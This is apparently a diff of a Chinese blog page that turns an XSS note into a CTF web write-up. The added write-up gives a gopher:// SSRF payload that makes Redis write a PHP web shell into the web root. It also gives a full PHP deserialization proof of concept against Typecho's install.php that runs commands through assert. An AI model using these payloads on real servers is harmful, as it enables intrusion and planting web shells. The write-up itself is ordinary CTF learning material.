+<p>生成<code>gopher://173.31.84.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</code></p>
+<p>在输入框内输入提交，然而一直转。。。了好久，以为靶机问题中间还重启了下靶机，然后等不了手动停了，访问<a href="http://173.31.84.11/shell.php已经有了flag，嗯。。。神奇" target="_blank" rel="noopener">http://173.31.84.11/shell.php已经有了flag，嗯。。。神奇</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713144707.png" alt=""></p>
+<h3 id="EZ三剑客-EzTypecho"><a href="#EZ三剑客-EzTypecho" class="headerlink" title="EZ三剑客-EzTypecho"></a>EZ三剑客-EzTypecho</h3><p>题目给了源码，打开靶机是Typecho博客的安装程序但不让安装</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713163648.png" alt=""></p>
+<p>在给出源码的changelog.txt里我们可以看到源码版本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713164514.png" alt=""></p>
+<p>百度下发现老版本有个install.php处反序列化漏洞。</p>
+<p>参考文章：<a href="https://blog.csdn.net/weixin_44005410/article/details/90385856" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44005410/article/details/90385856</a></p>
+<h4 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h4><p>直接拿了参考文章师傅的poc生成payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$CMD = <span class="string">'system("cat /flag")'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">        <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">private</span> $_type;</span><br><span class="line">        <span class="keyword">private</span> $_items;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">//$this-&gt;_type = $this::RSS2;</span></span><br><span class="line"> </span><br><span class="line">                <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::ATOM1;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">                        <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">                );</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = $GLOBALS[CMD];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">        <span class="string">'prefix'</span>  =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后按照文章中说的post传入payload即可，要注意一下保证referer是本站</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713165615.png" alt=""></p>
 
       
     </div>
@@ -431,7 +556,13 @@
       
         <div class="post-tags">
           
-            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
+          
+            <a href="/tags/ssrf/" rel="tag"><i class="fa fa-tag"></i> ssrf</a>
+          
+            <a href="/tags/Typecho/" rel="tag"><i class="fa fa-tag"></i> Typecho</a>
+          
+            <a href="/tags/redis/" rel="tag"><i class="fa fa-tag"></i> redis</a>
           
         </div>
       
@@ -444,8 +575,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/11/01/note2/" rel="next" title="xss学习日记(二）">
-                <i class="fa fa-chevron-left"></i> xss学习日记(二）
+              <a href="/2020/07/12/NPUCTF2020_web/" rel="next" title="NPUCTF2020web部分复现">
+                <i class="fa fa-chevron-left"></i> NPUCTF2020web部分复现
               </a>
             
           </div>
@@ -453,10 +584,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/11/04/note4/" rel="prev" title="xss学习日记(四）">
-                xss学习日记(四） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -665,7 +792,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS蠕虫"><span class="nav-number">1.</span> <span class="nav-text">XSS蠕虫</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基本概念"><span class="nav-number">1.1.</span> <span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">1.2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构建过程"><span class="nav-number">1.3.</span> <span class="nav-text">构建过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#世界上第一个xss蠕虫病毒-里程碑"><span class="nav-number">1.4.</span> <span class="nav-text">世界上第一个xss蠕虫病毒(里程碑)</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CheckIN"><span class="nav-number">1.</span> <span class="nav-text">CheckIN</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解题"><span class="nav-number">1.1.</span> <span class="nav-text">解题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cve版签到"><span class="nav-number">2.</span> <span class="nav-text">cve版签到</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解题-1"><span class="nav-number">2.1.</span> <span class="nav-text">解题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#老八小超市儿"><span class="nav-number">3.</span> <span class="nav-text">老八小超市儿</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解题-2"><span class="nav-number">3.1.</span> <span class="nav-text">解题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EZ三剑客-EzWeb"><span class="nav-number">4.</span> <span class="nav-text">EZ三剑客-EzWeb</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考点：Redis配合gopher协议进行SSRF"><span class="nav-number">4.1.</span> <span class="nav-text">考点：Redis配合gopher协议进行SSRF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EZ三剑客-EzTypecho"><span class="nav-number">5.</span> <span class="nav-text">EZ三剑客-EzTypecho</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解题-3"><span class="nav-number">5.1.</span> <span class="nav-text">解题</span></a></li></ol></li></ol></div>
             
 
           </div>
